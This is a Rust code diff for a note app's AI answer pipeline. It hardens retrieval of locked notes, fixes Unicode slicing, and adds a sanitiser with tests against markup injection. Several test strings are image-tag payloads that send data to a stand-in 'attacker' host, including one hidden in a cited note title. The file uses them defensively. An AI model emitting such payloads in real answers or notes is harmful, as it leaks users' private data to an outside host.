@@ -37,6 +37,10 @@ const RRF_K: f64 = 60.;
 /// most this much unless it is the only one.
 const MIN_PER_NOTE: usize = 400;
 const MAX_PER_NOTE: usize = 6000;
+/// A note that shares no word with the question is sent only when its meaning
+/// is a strong match, and then only its opening.
+const MEANING_ONLY_SIMILARITY: f32 = 0.5;
+const MEANING_ONLY_ROOM: usize = 400;
 /// How much of one note a tool result may carry.
 const TOOL_EXCERPT_ROOM: usize = 900;
 /// How much of one note `read_note` may return.
@@ -376,12 +380,24 @@ pub fn select(
         }
         let mut text = best_text(&candidate.body, &terms, room);
         if text.trim().is_empty() {
-            if !from_meaning && in_title == 0 {
+            if matched == 0 {
+                // No word in the note, title or body, matches the question:
+                // only a strong meaning-only hit may send it, and then only
+                // its opening, never thousands of characters.
+                if !candidate
+                    .meaning
+                    .is_some_and(|score| score >= MEANING_ONLY_SIMILARITY)
+                {
+                    continue;
+                }
+                text = opening(&candidate.body, room.min(MEANING_ONLY_ROOM));
+            } else if !from_meaning && in_title == 0 {
                 // Nothing in the note's text matches, and its title didn't
                 // either: it is not a reason to send the note.
                 continue;
+            } else {
+                text = opening(&candidate.body, room);
             }
-            text = opening(&candidate.body, room);
         }
         if text.trim().is_empty() {
             continue;
@@ -544,31 +560,18 @@ fn passages(body: &str) -> Vec<String> {
 
 /// `passage`, or the part of it around the first matching term when it is
 /// longer than `room`.
+///
+/// Matches are found on the original text, char by char, so offsets always
+/// land on a character boundary. (Lowercasing can change a string's byte
+/// length — `İ` grows, `K` and `ẞ` shrink — so offsets from a lowercased copy
+/// must never be used to slice the original.)
 fn passage_around(passage: &str, terms: &[String], room: usize) -> String {
     if passage.chars().count() <= room {
         return passage.to_owned();
     }
-    let lowered = passage.to_lowercase();
     let at = terms
         .iter()
-        .filter_map(|term| {
-            let mut start = 0;
-            while let Some(found) = lowered[start..].find(term) {
-                let found = start + found;
-                let before = lowered[..found].chars().next_back();
-                let after = lowered[found + term.len()..].chars().next();
-                if before.is_none_or(|c| !c.is_alphanumeric())
-                    && after.is_none_or(|c| !c.is_alphanumeric())
-                {
-                    return Some(found);
-                }
-                start = found + term.len().max(1);
-                if start >= lowered.len() {
-                    break;
-                }
-            }
-            None
-        })
+        .filter_map(|term| find_term_start(passage, term))
         .min()
         .unwrap_or(0);
     let chars: Vec<char> = passage.chars().collect();
@@ -576,6 +579,57 @@ fn passage_around(passage: &str, terms: &[String], room: usize) -> String {
     let start = at.saturating_sub(room / 4).min(chars.len());
     let end = (start + room).min(chars.len());
     chars[start..end].iter().collect()
+}
+
+/// The byte offset of the first whole-word, case-insensitive occurrence of
+/// `term` in `haystack`, if any.
+fn find_term_start(haystack: &str, term: &str) -> Option<usize> {
+    let term = term.to_lowercase();
+    if term.is_empty() {
+        return None;
+    }
+    for (start, _) in haystack.char_indices() {
+        if haystack[..start]
+            .chars()
+            .next_back()
+            .is_some_and(|c| c.is_alphanumeric())
+        {
+            continue;
+        }
+        if let Some(end) = match_at(haystack, start, &term)
+            && haystack[end..]
+                .chars()
+                .next()
+                .is_none_or(|c| !c.is_alphanumeric())
+        {
+            return Some(start);
+        }
+    }
+    None
+}
+
+/// The end byte offset when `term` (already lowercased) matches at `start`,
+/// comparing each original char's lowercase expansion. Returns `None` when it
+/// does not match or runs past the end of `haystack`.
+fn match_at(haystack: &str, start: usize, term: &str) -> Option<usize> {
+    let mut wanted = term.chars();
+    for (offset, ch) in haystack[start..].char_indices() {
+        let mut lowered = ch.to_lowercase();
+        let mut any = false;
+        for lower in lowered.by_ref() {
+            if wanted.next()? != lower {
+                return None;
+            }
+            any = true;
+        }
+        if !any {
+            return None;
+        }
+        if wanted.as_str().is_empty() {
+            return Some(start + offset + ch.len_utf8());
+        }
+    }
+    None
 }
 
 /// Runs `provider`'s answer to `prompt`, handing each event to `on_event`
@@ -686,6 +740,34 @@ fn is_remote_url(url: &str) -> bool {
     lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("//")
 }
 
+/// The final Markdown for display: citations linked, images removed, and every
+/// raw HTML tag neutralised. This is deliberately the last step, after
+/// [`linkify`], so a cited note title cannot smuggle `<img>` into the answer.
+pub fn sanitize_answer(answer: &str, used: &[Excerpt]) -> String {
+    let linked = linkify(answer, used);
+    let without_images = strip_remote_images(&linked);
+    neutralise_markup(&without_images)
+}
+
+/// Escapes every `<` so the Markdown parser can never produce an HTML node,
+/// and escapes the `![` opener so no Markdown image node can be produced
+/// either. A text answer cannot then make Kanso fetch anything.
+fn neutralise_markup(markdown: &str) -> String {
+    let mut out = String::with_capacity(markdown.len());
+    let mut chars = markdown.chars().peekable();
+    while let Some(ch) = chars.next() {
+        match ch {
+            '<' => out.push_str("&lt;"),
+            '!' if chars.peek() == Some(&'[') => {
+                out.push_str("!\\[");
+                chars.next();
+            }
+            other => out.push(other),
+        }
+    }
+    out
+}
+
 /// The tag names by ID, for deciding `#ai-exclude` from a note's tag IDs.
 fn tag_names(store: &Store) -> kanso_store::Result<HashMap<String, String>> {
     Ok(store
@@ -747,6 +829,21 @@ fn candidate_for(
         meaning,
     };
     Ok(eligible(&candidate).then_some(candidate))
+}
+
+/// Whether note `id` may still be sent: the same [`eligible`] decision used by
+/// retrieval, checked against the store. Any error counts as not eligible, so
+/// a follow-up history fails closed.
+pub fn note_is_eligible(store: &Store, id: &str) -> bool {
+    let id = if id.trim().starts_with("note:") {
+        id.trim().to_owned()
+    } else {
+        format!("note:{}", id.trim())
+    };
+    let Ok(names) = tag_names(store) else {
+        return false;
+    };
+    matches!(candidate_for(store, &id, &names, None), Ok(Some(_)))
 }
 
 /// Searches `store` for `question` and returns the excerpts to send, or
@@ -828,22 +925,9 @@ pub fn retrieve(store: &Store, question: &str) -> kanso_store::Result<Vec<Excerp
     let mut candidates = Vec::new();
     for id in ranked {
         let meaning = meaning_scores.get(&id).copied();
-        if let Some(doc) = docs.get(&id)
-            && !doc_locked(doc)
-        {
-            let title = doc.str_field("title").unwrap_or_default().to_owned();
-            let body = doc.str_field("body").unwrap_or_default().to_owned();
-            candidates.push(Candidate {
-                id: id.clone(),
-                title,
-                body,
-                tags: doc_tags(doc, &names),
-                locked: false,
-                trashed: false,
-                meaning,
-            });
-            continue;
-        }
+        // Every candidate goes through `candidate_for`, which re-checks the
+        // note (including a lock check that fails closed). Building one from a
+        // search row here would skip that check.
         if let Some(candidate) = candidate_for(store, &id, &names, meaning)? {
             candidates.push(candidate);
         }
@@ -1064,8 +1148,8 @@ pub fn tool_registry(store: Arc<Store>, used: Arc<Mutex<Vec<Excerpt>>>) -> ToolR
 mod tests {
     use super::{
         Candidate, MAX_NOTES, best_text, clamp_excerpts, eligible, fuse, is_exclude_tag, linkify,
-        question_terms, read_note, retrieve, search_notes, select, stream_answer,
-        strip_remote_images, tool_registry,
+        note_is_eligible, passage_around, question_terms, read_note, retrieve, sanitize_answer,
+        search_notes, select, stream_answer, strip_remote_images, tool_registry,
     };
     use kanso_ai::{AiError, ChatProvider, Event, Excerpt, Prompt, ToolRegistry};
     use kanso_core::DocType;
@@ -1667,6 +1751,7 @@ mod tests {
             // The nested notebook is inside the locked one, so its notes are
             // locked by ancestry with no lock field of their own.
             let mut excluded = Vec::new();
+            let mut searchable = Vec::new();
             let mut allowed = Vec::new();
             for (ix, kind) in cases.iter().enumerate() {
                 let title = format!("zebra note {ix}");
@@ -1682,7 +1767,8 @@ mod tests {
                                 Origin::Sync,
                             )
                             .unwrap();
-                        excluded.push(id);
+                        excluded.push(id.clone());
+                        searchable.push(id);
                         continue;
                     }
                     1 => {
@@ -1696,19 +1782,16 @@ mod tests {
                             )
                             .unwrap();
                         excluded.push(id.clone());
+                        searchable.push(id.clone());
                         id
                     }
                     2 => {
+                        // An unsealed note inside a locked notebook: only
+                        // `in_locked_notebook` protects it, with no lock
+                        // field of its own.
                         let id = note_in(&store, &title, "", vec![], Some(&nested_book));
-                        store
-                            .put(
-                                DocType::Note,
-                                json!({"_id": id, "kansoLock": {"salt": "abc"}}),
-                                Put::Merge,
-                                Origin::Sync,
-                            )
-                            .unwrap();
                         excluded.push(id.clone());
+                        searchable.push(id.clone());
                         id
                     }
                     3 => {
@@ -1724,6 +1807,7 @@ mod tests {
                             .id;
                         let id = note(&store, &title, &body, vec![tag]);
                         excluded.push(id.clone());
+                        searchable.push(id.clone());
                         id
                     }
                     _ => {
@@ -1737,6 +1821,25 @@ mod tests {
             // Embed everything the store can see, including sealed notes
             // (from their title) so meaning search really could rank them.
             embed_all(&store, &Letters);
+            // The store's own search really did return each excluded note
+            // (except trashed ones, which search never sees), so the filter
+            // below is what dropped it.
+            let params = kanso_store::SearchParams {
+                query: kanso_core::Query {
+                    clauses: vec![kanso_core::query::Clause::text("zebra")],
+                },
+                limit: Some(100),
+                ..kanso_store::SearchParams::default()
+            };
+            let searched: Vec<String> = store
+                .search(&params)
+                .unwrap()
+                .into_iter()
+                .map(|doc| doc.id)
+                .collect();
+            for id in &searchable {
+                prop_assert!(searched.contains(id), "{id} never reached the filter");
+            }
             let used = Mutex::new(Vec::new());
             let found = retrieve(&store, "zebra").unwrap();
             let tool_found = search_notes(&store, "zebra", &used).unwrap();
@@ -1816,6 +1919,84 @@ mod tests {
         let found = retrieve(&store, "plan").unwrap();
         assert!(found.len() <= MAX_NOTES);
     }
+    /// The image and HTML nodes the view would render for `markdown`.
+    fn rendered_markup(markdown: &str) -> (usize, Vec<String>) {
+        fn walk(node: &markdown::mdast::Node, images: &mut usize, html: &mut Vec<String>) {
+            match node {
+                markdown::mdast::Node::Image(_) | markdown::mdast::Node::ImageReference(_) => {
+                    *images += 1;
+                }
+                markdown::mdast::Node::Html(value) => html.push(value.value.clone()),
+                _ => {}
+            }
+            if let Some(children) = node.children() {
+                for child in children {
+                    walk(child, images, html);
+                }
+            }
+        }
+        let root = markdown::to_mdast(markdown, &markdown::ParseOptions::gfm())
+            .expect("sanitised Markdown parses");
+        let mut images = 0;
+        let mut html = Vec::new();
+        walk(&root, &mut images, &mut html);
+        (images, html)
+    }
+
+    #[test]
+    fn raw_html_in_an_answer_never_renders() {
+        let answers = [
+            "Look <img src=\"https://attacker/?d=secret\">",
+            "Look <IMG SRC=\"https://attacker/?d=secret\">",
+            "Look <img/src=https://attacker/?d=secret>",
+            "<picture><source srcset=\"https://attacker/?d=secret 1x\"></picture>",
+            "<!-- <img src=\"https://attacker/?d=secret\"> -->",
+        ];
+        for answer in answers {
+            let cleaned = sanitize_answer(answer, &[]);
+            let (images, html) = rendered_markup(&cleaned);
+            assert_eq!(images, 0, "{answer:?} rendered an image: {cleaned:?}");
+            assert!(html.is_empty(), "{answer:?} left HTML: {html:?}");
+            assert!(!cleaned.contains("<img"), "{cleaned:?}");
+        }
+    }
+
+    #[test]
+    fn a_cited_title_cannot_smuggle_markup() {
+        let used = vec![excerpt_for(
+            "<img src=\"https://attacker/?d=secret\">",
+            "words",
+        )];
+        let cleaned = sanitize_answer("See [[<img src=\"https://attacker/?d=secret\">]].", &used);
+        let (images, html) = rendered_markup(&cleaned);
+        assert_eq!(images, 0, "{cleaned}");
+        assert!(html.is_empty(), "{html:?}");
+        assert!(cleaned.contains("inkdrop://note/"), "{cleaned}");
+    }
+
+    proptest! {
+        #![proptest_config(ProptestConfig {
+            cases: 128,
+            failure_persistence: Some(Box::new(FileFailurePersistence::WithSource("regressions"))),
+            ..ProptestConfig::default()
+        })]
+
+        /// Whatever an answer says, the Markdown Kanso renders has no image
+        /// node and no HTML node carrying a source.
+        #[test]
+        fn prop_no_answer_can_render_an_image_or_html(
+            answer in "\\PC{0,500}",
+        ) {
+            let cleaned = sanitize_answer(&answer, &[]);
+            let (images, html) = rendered_markup(&cleaned);
+            prop_assert_eq!(images, 0, "{} rendered an image", answer);
+            for node in html {
+                let lower = node.to_ascii_lowercase();
+                prop_assert!(!lower.contains("src") && !lower.contains("srcset"), "{node}");
+            }
+        }
+    }
+
     #[test]
     fn images_from_the_network_are_never_rendered() {
         assert_eq!(
@@ -1844,6 +2025,127 @@ mod tests {
             prop_assert!(!cleaned.contains("https://"));
             prop_assert!(!cleaned.contains("!["));
         }
+    }
+
+    #[test]
+    fn a_dropped_offset_can_never_split_a_character() {
+        // `İ` lowercases to two chars, so a match after it sits at a larger
+        // byte offset in the lowercased copy than in the original.
+        let passage = format!(
+            "{} İstanbul şube {}",
+            "dolgu ".repeat(80),
+            "son ".repeat(80)
+        );
+        let out = passage_around(&passage, &["şube".to_owned()], 200);
+        assert!(passage.contains(&out));
+        assert!(out.contains("şube"), "{out}");
+
+        // The Kelvin sign shrinks when lowercased, so the old offset landed
+        // wrongly in the original.
+        let passage = format!(
+            "\u{212A}elvin ölçü {} hedef {}",
+            "dolgu ".repeat(80),
+            "son ".repeat(80)
+        );
+        let out = passage_around(&passage, &["hedef".to_owned()], 200);
+        assert!(passage.contains(&out));
+        assert!(out.contains("hedef"), "{out}");
+
+        // Capital sharp S shrinks too.
+        let passage = format!("ẞtraße {} ziel {}", "dolgu ".repeat(80), "son ".repeat(80));
+        let out = passage_around(&passage, &["ziel".to_owned()], 200);
+        assert!(passage.contains(&out));
+        assert!(out.contains("ziel"), "{out}");
+    }
+
+    proptest! {
+        #![proptest_config(ProptestConfig {
+            cases: 256,
+            failure_persistence: Some(Box::new(FileFailurePersistence::WithSource("regressions"))),
+            ..ProptestConfig::default()
+        })]
+
+        /// Any Unicode passage and term: no panic, and the excerpt is always a
+        /// whole-character substring of the passage within its room.
+        #[test]
+        fn prop_passage_around_never_panics(
+            passage in "\\PC{0,600}",
+            term in "\\PC{0,24}",
+            room in 1usize..300,
+        ) {
+            let out = passage_around(&passage, &[term], room);
+            prop_assert!(out.chars().count() <= room);
+            prop_assert!(passage.contains(&out), "{passage:?} -> {out:?}");
+        }
+    }
+
+    #[test]
+    fn a_meaning_only_hit_needs_a_stronger_match_and_sends_only_the_opening() {
+        let body = "a".repeat(2000);
+        let weak = Candidate {
+            id: "note:weak".into(),
+            title: "Weak".into(),
+            body: body.clone(),
+            tags: vec![],
+            locked: false,
+            trashed: false,
+            meaning: Some(0.36),
+        };
+        assert!(select("zzzz", &[weak], 8, 20_000).is_empty());
+
+        let strong = Candidate {
+            id: "note:strong".into(),
+            title: "Strong".into(),
+            body,
+            tags: vec![],
+            locked: false,
+            trashed: false,
+            meaning: Some(0.6),
+        };
+        let chosen = select("zzzz", &[strong], 8, 20_000);
+        assert_eq!(chosen.len(), 1);
+        assert_eq!(chosen[0].text.chars().count(), super::MEANING_ONLY_ROOM);
+        assert!(chosen[0].text.chars().all(|ch| ch == 'a'));
+    }
+
+    #[test]
+    fn a_citation_is_ineligible_once_its_note_is_locked() {
+        let (_dir, store) = open();
+        let id = note(&store, "Pricing", "The yearly plan is 40 dollars.", vec![]);
+        assert!(note_is_eligible(&store, &id));
+        store
+            .put(
+                DocType::Note,
+                json!({"_id": id, "kansoLock": {"salt": "abc"}}),
+                Put::Merge,
+                Origin::Sync,
+            )
+            .unwrap();
+        assert!(!note_is_eligible(&store, &id));
+    }
+
+    #[test]
+    fn a_lock_check_error_fails_closed() {
+        let (_dir, store) = open();
+        store.set_embedding_model(Some("letters")).unwrap();
+        store.lend_embedder(Some(Arc::new(Letters)));
+        let id = note(
+            &store,
+            "Secret pricing",
+            "The secret pricing is 99.",
+            vec![],
+        );
+        embed_all(&store, &Letters);
+        // Every lock check now errors: the view it reads is gone.
+        {
+            let conn = rusqlite::Connection::open(store.path()).unwrap();
+            conn.execute("DROP VIEW locked_books", []).unwrap();
+        }
+        // The eligibility decision used by the second retrieval pass (and by
+        // follow-up history) treats an error as locked.
+        assert!(!note_is_eligible(&store, &id));
+        let found = retrieve(&store, "Secret pricing").unwrap_or_default();
+        assert!(found.iter().all(|excerpt| excerpt.id != id), "{found:?}");
     }
 
     #[test]
